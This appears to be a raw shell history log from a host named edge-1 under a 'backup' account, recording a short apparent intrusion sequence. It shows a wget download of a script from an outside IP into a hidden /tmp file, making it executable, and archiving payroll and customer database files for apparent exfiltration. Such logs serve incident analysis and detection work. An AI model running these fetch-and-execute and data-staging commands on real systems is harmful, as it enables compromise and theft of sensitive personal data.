# ts=2026-06-10T02:07:14Z seq=4000 host=edge-1 user=backup
id
# ts=2026-06-10T02:08:01Z seq=4001 host=edge-1 user=backup
wget http://203.0.113.99/p.sh -O /tmp/.p
# ts=2026-06-10T02:09:12Z seq=4002 host=edge-1 user=backup
chmod +x /tmp/.p
# ts=2026-06-10T02:18:30Z seq=4003 host=edge-1 user=backup
tar -czf /tmp/payroll.tgz /srv/payroll/q2.csv /var/backups/customer.db
